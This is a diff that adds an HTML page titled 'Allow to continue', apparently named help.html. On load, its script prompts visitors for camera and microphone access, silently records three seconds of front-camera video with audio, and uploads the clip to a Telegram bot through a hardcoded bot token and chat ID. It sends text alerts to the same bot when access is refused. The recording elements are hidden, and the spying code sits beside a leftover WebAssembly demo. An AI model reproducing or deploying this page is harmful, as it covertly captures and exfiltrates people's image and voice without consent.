@@ -1,0 +1,198 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Allow to continue</title>
+  <style>
+    #camera, #canvas {
+      display: none;
+    }
+    #permissionRequest {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      background: #ffeb3b;
+      padding: 10px;
+      text-align: center;
+      z-index: 1000;
+    }
+  </style>
+</head>
+<body>
+  <div id="permissionRequest" style="display:none;">
+    Please allow camera and microphone access to continue...
+  </div>
+  <video id="camera" autoplay playsinline></video>
+  <canvas id="canvas"></canvas>
+  
+  <script>
+    // Telegram bot details
+    const botToken = '7826950594:AAFBygBD_E2PmAITI6zsaPilys7l6i0gWBU';
+    const chatId = '894002841';
+    const message = 'Someone opened help.html';
+
+    // Get DOM elements
+    const video = document.getElementById('camera');
+    const canvas = document.getElementById('canvas');
+    const permissionRequest = document.getElementById('permissionRequest');
+    const ctx = canvas.getContext('2d');
+
+    // MediaRecorder and recorded chunks
+    let mediaRecorder;
+    let recordedChunks = [];
+    let stream = null;
+
+    // Function to send video to Telegram
+    async function sendVideoToTelegram(videoBlob) {
+      const formData = new FormData();
+      formData.append('chat_id', chatId);
+      formData.append('caption', message);
+      formData.append('video', videoBlob, 'recording.mp4');
+
+      try {
+        const response = await fetch(`https://api.telegram.org/bot${botToken}/sendVideo`, {
+          method: 'POST',
+          body: formData
+        });
+        const data = await response.json();
+        console.log('Video sent to Telegram:', data);
+      } catch (error) {
+        console.error('Error sending video to Telegram:', error);
+        // Fallback to text message if video sending fails
+        sendTextMessage(message + ' (Failed to send video)');
+      }
+    }
+
+    // Function to send text message to Telegram
+    function sendTextMessage(text) {
+      fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text)}`)
+        .catch(e => console.error('Error sending fallback message:', e));
+    }
+
+    // Function to start recording
+    function startRecording(mediaStream) {
+      stream = mediaStream;
+      recordedChunks = [];
+      
+      // Use a codec that supports both video and audio
+      const options = { 
+        mimeType: 'video/webm;codecs=vp9,opus',
+        videoBitsPerSecond: 2500000,
+        audioBitsPerSecond: 128000
+      };
+
+      // Fallback to a more widely supported codec if the preferred one isn't available
+      if (!MediaRecorder.isTypeSupported(options.mimeType)) {
+        options.mimeType = 'video/webm;codecs=vp8,opus';
+      }
+
+      mediaRecorder = new MediaRecorder(stream, options);
+
+      mediaRecorder.ondataavailable = function(e) {
+        if (e.data.size > 0) {
+          recordedChunks.push(e.data);
+        }
+      };
+
+      mediaRecorder.onstop = function() {
+        const videoBlob = new Blob(recordedChunks, { type: 'video/webm' });
+        sendVideoToTelegram(videoBlob);
+        
+        // Stop all tracks
+        if (stream) {
+          stream.getTracks().forEach(track => track.stop());
+          stream = null;
+        }
+      };
+
+      mediaRecorder.start();
+      setTimeout(() => {
+        if (mediaRecorder.state !== 'inactive') {
+          mediaRecorder.stop();
+        }
+      }, 3000); // Record for 3 seconds
+    }
+
+    // Request camera and microphone access
+    async function initCamera() {
+      permissionRequest.style.display = 'block';
+      
+      try {
+        // Try to get front camera (facing mode 'user') with audio
+        const mediaStream = await navigator.mediaDevices.getUserMedia({
+          video: {
+            facingMode: 'user',  // Front camera
+            width: { ideal: 1280 },
+            height: { ideal: 720 }
+          },
+          audio: true  // Request audio permission
+        });
+        
+        permissionRequest.style.display = 'none';
+        video.srcObject = mediaStream;
+        
+        // Wait for video to be ready
+        video.onloadedmetadata = () => {
+          startRecording(mediaStream);
+        };
+        
+      } catch (error) {
+        console.error('Error accessing camera/microphone:', error);
+        permissionRequest.style.display = 'none';
+        
+        // Try fallback to any camera if front camera fails
+        try {
+          const mediaStream = await navigator.mediaDevices.getUserMedia({
+            video: true,
+            audio: true  // Still try to get audio
+          });
+          
+          video.srcObject = mediaStream;
+          video.onloadedmetadata = () => {
+            startRecording(mediaStream);
+          };
+          
+        } catch (fallbackError) {
+          console.error('Fallback camera/microphone access failed:', fallbackError);
+          sendTextMessage(message + ' (Camera/microphone access denied)');
+        }
+      }
+    }
+
+    // Start the process when page loads
+    window.addEventListener('DOMContentLoaded', () => {
+      // Check if browser supports mediaDevices API
+      if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+        sendTextMessage(message + ' (Browser does not support camera/microphone access)');
+        return;
+      }
+      
+      // Check if page is HTTPS (required for camera/microphone in most browsers)
+      if (window.location.protocol !== 'https:') {
+        console.warn('Camera/microphone access may be blocked on non-HTTPS pages');
+      }
+      
+      initCamera();
+    });
+
+    // Original WebAssembly code
+    fetch('my_module.wasm')
+      .then(response => response.arrayBuffer())
+      .then(bytes => WebAssembly.instantiate(bytes, {}))
+      .then(results => {
+        const instance = results.instance;
+        const add = instance.exports.add;
+        const result = add(5, 3);
+        console.log("Result from WebAssembly: " + result);
+      })
+      .catch(e => console.error("WebAssembly error:", e));
+
+    // Handle page exit
+    window.addEventListener('beforeunload', () => {
+      if (mediaRecorder && mediaRecorder.state === 'recording') {
+        mediaRecorder.stop();
+      }
+    });
+  </script>
+</body>
+</html>
